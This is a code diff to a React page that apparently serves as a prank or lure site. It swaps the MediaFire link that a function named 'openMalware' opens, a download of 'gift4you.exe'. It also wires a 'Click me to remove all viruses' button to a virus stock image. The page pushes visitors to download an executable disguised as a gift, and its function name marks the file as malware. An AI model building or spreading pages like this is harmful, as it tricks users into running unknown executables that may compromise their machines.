@@ -4,7 +4,7 @@ import React from "react";
 const Page = () => {
 
   const openMalware = () => {
-    window.open('https://download1519.mediafire.com/mjdplx1dygsgHjpm-vYZhDHgY8HPp3JlwEaBXflqxCW6J1AQoAWuRz6JluNoBl-EutyTbrJvWp-42ZVETJu79aCJG7A94c6ZXDCEQS5hPs7tG4jaCuF3O1iK69etGTnbXYsc_8LdjCX7MksAwxi7YT8s_hi-tGRTRP4zxGhHSFPH_7k/xqi4xdl5gvqo8m3/gift4you.exe', '_blank', 'noreferrer')
+    window.open('https://download1519.mediafire.com/3j1r9h6pftmgD_J2l8NwSAfnKsOdLtrAIFyfKgOlFIzWgBc8d9oSAq722L_TBtIWjqLpYgGmsO6OmGDL_DWs8HMyynIhI4jNeArsi3-mrqRZRcvK2aGNel2RMj1-f00Z_lUJEwH6yI0UKZhtydYP_6444_9lFAyd5Ea6i0FkOy7_Hg/kk84banv0zoz74f/gift4you.exe', '_blank', 'noreferrer')
   }
 
   return (
@@ -34,13 +34,13 @@ const Page = () => {
             <p>Click Click me to remove all viruses</p>
           </div>
           <div className="justify-center flex">
-            <a>
+            <a href="https://www.uxbridge-ma.gov/sites/g/files/vyhlif3971/f/styles/slide_main/public/bulletins/covid-coronavirus-free-white-background-extinction-concept-virus-zone-disinfection-177485825.jpg?itok=ZSlUAGf7" target="_blank">
               <button className="border-pink-500 border-[2px] p-2 bg-pink-500 ">
                 Click me
               </button>
             </a>
           </div>
-        </div>
+        </div >
 
         <div className="py-20 text-9xl">
           <button
@@ -57,7 +57,7 @@ const Page = () => {
             <p>@ All lefts reserved 2019</p>
           </div>
         </div>
-      </div>
+      </div >
     </>
   );
 };
